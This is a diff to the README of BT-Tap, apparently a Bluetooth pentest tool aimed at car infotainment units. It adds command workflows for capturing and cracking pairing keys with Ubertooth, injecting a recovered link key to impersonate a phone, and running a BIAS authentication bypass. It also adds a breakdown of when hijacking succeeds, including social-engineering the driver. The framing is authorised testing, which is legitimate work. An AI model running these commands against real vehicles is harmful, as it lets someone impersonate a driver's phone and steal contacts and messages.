@@ -82,10 +82,12 @@ Built in Python with a Rich-powered CLI, BT-Tap wraps the Linux Bluetooth stack 
 - **Adapter restore** — revert to original MAC after testing
 
 ### Vulnerability Assessment
-- **CVE scanning** — BlueBorne, KNOB, BIAS, BLURtooth, BLUFFS, PerfektBlue
-- **Legacy pairing detection** — identify devices without SSP
-- **Open service analysis** — flag unauthenticated PBAP/MAP/OPP access
-- **Encryption audit** — check for weak or absent encryption
+- **Evidence-based findings** — each result is tagged as `confirmed`, `potential`, or `unverified`
+- **CVE susceptibility heuristics** — BlueBorne, KNOB, BLURtooth (version/evidence-based indicators)
+- **Legacy pairing indicators** — detect missing SSP advertisement and probe pairing method (e.g., Just Works)
+- **Active service exposure probes** — verify sensitive RFCOMM service reachability
+- **BLE writable-surface analysis** — enumerate writable GATT characteristics
+- **BIAS tracking** — flagged as requiring active validation (not passively confirmed)
 
 ### Offensive Testing
 - **Pairing flood DoS** — rapid pairing request bombardment
@@ -850,7 +852,8 @@ sudo bt-tap at snarf AA:BB:CC:DD:EE:FF -m MC -r 1-50  # Missed calls
 
 ### Vulnerability Scanning
 
-Scan a target for known Bluetooth CVEs and configuration weaknesses.
+Scan a target for Bluetooth CVE indicators and configuration weaknesses using
+an evidence-based model (`confirmed` / `potential` / `unverified`).
 
 ```bash
 # Full vulnerability scan
@@ -867,15 +870,17 @@ sudo bt-tap -v vulnscan AA:BB:CC:DD:EE:FF
 
 | Check | What It Tests |
 |-------|--------------|
-| SSP Support | Secure Simple Pairing — devices without SSP use vulnerable legacy PIN pairing |
-| Open Services | PBAP/MAP/OPP accessible without authentication |
-| BlueBorne | CVE-2017-0781 / CVE-2017-1000251 — RCE without pairing |
-| KNOB | CVE-2019-9506 — encryption key negotiation downgrade |
-| BIAS | CVE-2020-10135 — paired device impersonation |
-| BLURtooth | CVE-2020-15802 — cross-transport key overwrite |
-| BLUFFS | 2023 — session key forcing attacks |
-| PerfektBlue | 2025 — automotive AVRCP/RFCOMM RCE |
-| Encryption | Weak or absent encryption on active connections |
+| SSP Support | Checks whether SSP is advertised in SDP (legacy-pairing indicator if absent) |
+| Sensitive RFCOMM Services | Actively probes advertised PBAP/MAP/OPP-like RFCOMM channels for reachability |
+| Pairing Method Probe | Attempts to detect pairing method (e.g., Just Works vs Numeric Comparison) |
+| Writable GATT Surface | Enumerates writable BLE characteristics as attack-surface indicators |
+| BlueBorne Indicator | Looks for vulnerable BlueZ version strings in SDP output (heuristic) |
+| KNOB Indicator | Flags versions below BT 5.1 as potentially susceptible (heuristic) |
+| BLURtooth Indicator | Flags BT 4.2–5.0 as potentially susceptible (heuristic) |
+| BIAS | Marked as unverified without active exploit validation |
+
+> Note: `vulnscan` is a triage tool. It does not claim definitive exploitability
+> for a CVE unless direct evidence is observed.
 
 ---
 
@@ -1144,7 +1149,48 @@ sudo bt-tap tpms sdr -d 60
 sudo bt-tap tpms flood --mode random -d 30
 ```
 
-### Workflow 6: Resilience Testing
+### Workflow 6: Ubertooth Pairing Capture + Key Cracking
+
+```bash
+# Scan for active piconets (requires Ubertooth One hardware)
+sudo bt-tap recon ubertooth-scan -d 30
+
+# Follow target device's piconet and capture to pcap
+sudo bt-tap recon ubertooth-follow AA:BB:CC:DD:EE:FF -o capture.pcap -d 120
+
+# Sniff BLE pairing exchange (wait for phone-IVI pairing)
+sudo bt-tap recon ubertooth-ble -t AA:BB:CC:DD:EE:FF -o ble_pair.pcap -d 120
+
+# Crack BLE pairing key from captured exchange
+sudo bt-tap recon crack-key ble_pair.pcap -o decrypted.pcap
+
+# Extract BR/EDR link key from Classic pairing capture
+sudo bt-tap recon extract-link-key capture.pcap
+
+# Inject recovered key into BlueZ for impersonation
+sudo bt-tap recon inject-link-key AA:BB:CC:DD:EE:FF <32-hex-char-key>
+
+# Now connect — BlueZ will use the injected key
+sudo bt-tap hijack AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 -n "Galaxy S24"
+```
+
+### Workflow 7: BIAS Authentication Bypass (CVE-2020-10135)
+
+```bash
+# Probe if IVI is potentially vulnerable to BIAS
+sudo bt-tap bias probe AA:BB:CC:DD:EE:FF 11:22:33:44:55:66
+
+# Execute BIAS attack (auto-selects best method)
+sudo bt-tap bias attack AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 -n "Galaxy S24"
+
+# Or use BIAS within the full hijack chain
+sudo bt-tap hijack AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 -n "Galaxy S24" --bias
+
+# If software approach fails, try InternalBlue (Broadcom/Cypress chipsets)
+sudo bt-tap bias attack AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 -m internalblue
+```
+
+### Workflow 8: Resilience Testing
 
 ```bash
 # DoS + fuzzing to test IVI stability
@@ -1153,6 +1199,64 @@ sudo bt-tap dos name-flood AA:BB:CC:DD:EE:FF --length 248
 sudo bt-tap fuzz l2cap AA:BB:CC:DD:EE:FF --psm 1 --mode malformed --count 200
 sudo bt-tap fuzz at AA:BB:CC:DD:EE:FF --channel 1 --patterns "long,null,format"
 ```
+
+---
+
+## When Does Hijack Actually Work?
+
+The core attack (spoof phone MAC → connect to IVI → extract data) depends on the
+IVI's authentication enforcement. Here's an honest breakdown:
+
+### Works (high success probability)
+
+| Scenario | Why |
+|----------|-----|
+| **IVI uses "Just Works" pairing** | No user confirmation or key validation on reconnect |
+| **IVI doesn't validate link key on reconnect** | Accepts any device with the right MAC + name |
+| **Driver accepts pairing prompt** | Social engineering — driver sees familiar phone name, taps "Yes" |
+| **Pre-2019 IVI (BT 2.1–4.2)** | Older stacks often skip mutual authentication |
+| **Aftermarket head units** | Pioneer, Kenwood, etc. — typically minimal security |
+| **BIAS-vulnerable IVI (CVE-2020-10135)** | Role-switch bypasses authentication (use `--bias` flag) |
+| **Recovered link key** | Ubertooth capture + crack → inject key → legitimate connection |
+
+### Does NOT work (expected secure behavior)
+
+| Scenario | Why | Workaround |
+|----------|-----|------------|
+| **IVI validates stored link key** | We spoofed the MAC but don't have the 128-bit key | Capture pairing with Ubertooth, crack key, inject |
+| **IVI enforces Secure Connections Only mode** | Rejects legacy auth downgrade | Need actual link key or BIAS via InternalBlue |
+| **BT 5.3+ with mutual auth patches** | Both sides must prove key knowledge | Vendor-specific — test anyway |
+| **IVI requires Numeric Comparison** | 6-digit code must match on both screens | Need physical access or social engineering |
+
+### Technical Detail: The Link Key Problem
+
+```
+Standard hijack flow:
+  You → spoof MAC "AA:BB:CC:DD:EE:FF" (phone's address)
+  You → connect to IVI
+  IVI → "I know AA:BB:CC:DD:EE:FF, we share link key 0xABCD1234..."
+  IVI → "Prove you know the key" (challenge-response)
+  You → ??? (don't have the key) → AUTH FAILURE
+
+With Ubertooth key recovery:
+  Ubertooth → sniff original phone-IVI pairing exchange
+  Crackle/tshark → extract link key from captured LMP frames
+  bt-tap → inject recovered key into BlueZ
+  You → connect with correct key → SUCCESS
+
+With BIAS (CVE-2020-10135):
+  You → spoof MAC, connect to IVI
+  During LMP auth → force role switch (central↔peripheral)
+  IVI → confused about who should authenticate whom
+  Auth → completed unilaterally or skipped → SUCCESS (if unpatched)
+```
+
+### Recommendation for Pentesters
+
+1. **Always try simple hijack first** — many IVIs don't enforce key validation
+2. **If rejected**, run `bt-tap bias probe` to check BIAS vulnerability
+3. **If BIAS fails**, use Ubertooth to capture the real pairing exchange
+4. **Document which scenario** the IVI falls into — this IS the pentest finding
 
 ---
 
@@ -1260,13 +1364,13 @@ sudo bt-tap adapter list
 | Directory | Files | Purpose |
 |-----------|-------|---------|
 | `bt_tap/core/` | 3 | Adapter mgmt, scanning, MAC spoofing |
-| `bt_tap/recon/` | 6 | SDP, GATT, fingerprint, RFCOMM/L2CAP scan, HCI capture |
-| `bt_tap/attack/` | 13 | PBAP, MAP, HFP, A2DP, AVRCP, OPP, AT, TPMS, hijack, auto, vuln, DoS, fuzz |
+| `bt_tap/recon/` | 7 | SDP, GATT, fingerprint, RFCOMM/L2CAP scan, HCI capture, Ubertooth/Crackle |
+| `bt_tap/attack/` | 14 | PBAP, MAP, HFP, A2DP, AVRCP, OPP, AT, TPMS, BIAS, hijack, auto, vuln, DoS, fuzz |
 | `bt_tap/report/` | 2 | HTML/JSON report generation |
-| `bt_tap/utils/` | 2 | Rich UI output system, BT helpers |
+| `bt_tap/utils/` | 3 | Rich UI output system, BT helpers, interactive prompts |
 | `bt_tap/` | 2 | CLI entry point, package init |
 
-**34 files, ~8,500 lines of Python.**
+**37 files, ~10,000 lines of Python.**
 
 ---
 
